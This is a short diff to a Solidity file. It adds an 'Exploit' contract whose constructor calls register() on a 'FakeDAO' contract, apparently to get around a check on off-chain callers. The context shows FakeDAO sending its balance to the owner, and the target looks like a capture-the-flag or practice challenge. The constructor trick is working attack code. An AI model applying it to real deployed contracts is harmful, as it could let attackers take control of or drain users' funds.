@@ -70,3 +70,9 @@ contract FakeDAO is OffchainCheckOwner {
         payable(owner).transfer(address(this).balance);
     }
 }
+
+contract Exploit {
+    constructor(FakeDAO instance) {
+        instance.register();
+    }
+}
